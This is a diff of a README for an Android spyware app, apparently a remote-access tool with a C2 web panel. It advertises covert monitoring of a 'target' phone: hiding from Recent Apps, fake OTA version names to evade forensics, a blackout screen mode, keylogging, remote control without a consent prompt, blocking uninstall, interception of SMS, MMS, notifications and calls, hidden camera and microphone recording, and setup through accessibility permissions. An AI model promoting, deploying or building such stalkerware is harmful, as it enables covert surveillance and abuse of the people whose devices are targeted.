@@ -28,7 +28,7 @@
 -   👻 **Task-List Ghosting**: The app is hard-coded to be **invisible in the Android "Recent Apps" list**, ensuring it leaves no footprint during multitasking.
 -   📡 **Deep Rebranding**: When stealth is active, all background service notifications are automatically rebranded with matching icons and names to ensure zero branding leaks in the system tray.
 -   🎲 **Dynamic OTA Camouflage**: Generates **random version names and codes** that mimic legitimate system OTA updates to confuse forensic analysis.
--   🌑 **Blackout Mode**: A high-stealth mode designed to **physically mask the device display** while maintaining a live remote feed. This protocol forces the screen to the lowest hardware brightness and applies an opaque mask that is virtually invisible on OLED displays, allowing for covert monitoring while the device appears dead.
+- ** **NEW** 🌑 **Blackout Mode**: A high-stealth mode designed to **physically mask the device display** while maintaining a live remote feed. This protocol forces the screen to the lowest hardware brightness and applies an opaque mask that is virtually invisible on OLED displays, allowing for covert monitoring while the device appears dead.
 
 ---
 
@@ -38,20 +38,21 @@
     -   **Live Keylogging**: Intercept **keystrokes and system text in real-time** from any app.
     -   **📱 Ghost Screen Control/Mirror**: Cast the **live screen** and **control** the **device remotely**, essentially giving you **full control of the device** with **NO "Consent Prompt"** required.
 -   💀  **Anti-Removal Shield**: Automatically **blocks attempts** to **Uninstall or Force Stop** the app.
--   🛰️ **Precision GPS Tracking**: One-click uplink to open the **target's exact real-time location** in **Google Maps**.
--   ⚡  **Intel Stream (Notification Sniffer)**: Intercept **every notification** that hits the device (*WhatsApp, Telegram, RCS, System*) and view them in a **live** chronological feed.
+-   🛰️  **Precision GPS Tracking**: One-click uplink to open the **target's exact real-time location** in **Google Maps**.
+-   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** that hits the device (*WhatsApp, Telegram, RCS, System*) and view them in a **live** chronological feed.
 -   🖼️ **MMS Terminal (Game Changer!)**:
     -   **Browse & Extract**: Download and view **ANY Multimedia Message (MMS)** including **Images and Videos** stored on the device.
     -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone with a built-in **file browser** to pick **media from your PC**.
 -   💬 **SMS Command Center**:
     -   **Full Interception**: Browse and copy **every sent/received** text message.
     -   **Remote Texting**: Send SMS from the **target's number** to **any destination worldwide**.
--   📸 **Tactical Surveillance Hub**: *(All Hub operations are strictly hidden from user.)*
+-   📸 **Tactical Surveillance Hub**: ** **NEW ALL-IN-ONE DESIGN**
+    > Info - *All Surveillance Hub operations are strictly hidden from user.*
     -   **Live Camera Streaming**: View **high-speed video** feeds from **both front** and **back cameras**.
-    -   **🌙 Night Vision Mode**: Sensor-boosted **low-light mode** for visibility in **near-total darkness**.
-    -   **Hardware Stability Engine**: Unified camera management **prevents resource conflicts**, ensuring reliable **background capture** and **streaming** even on **high-security Android 15/16 devices**.
     -   **Covert Recording**: **Stealthily record** high-quality **video without any user-facing activity**.
     -   **Instant Capture**: Take high-resolution **photos remotely**.
+    -   **🌙 Night Vision Mode**: Sensor-boosted **low-light mode** for visibility in **near-total darkness**.
+    -   **Hardware Stability Engine**: Unified camera management **prevents resource conflicts**, ensuring reliable **background capture** and **streaming** even on **high-security Android 15/16 devices**.
 -   🎙️ **Acoustics & Interception**:
     -   **Ambient Monitoring**: Live **microphone recording** for **high-fidelity audio surveillance**.
     -   **Call Recording**: Automatically **records** both **incoming and outgoing** phone calls.
@@ -109,7 +110,7 @@ During security research, a **critical behavior** in modern Android networking w
 3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
 4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target/Test device**.
 
-> Info - *To use the Ghost features you must navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities" and the "Ghost Keylogs" any other features can be used without this permission)*
+> Info - *To use the Ghost features you must navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". All other features can be used without this permission)*
 
 [![Accessibilities-Perm.png](https://i.postimg.cc/Z510fCkq/Accessibilities-Perm.png)](https://postimg.cc/CRsF5Mxy)
 
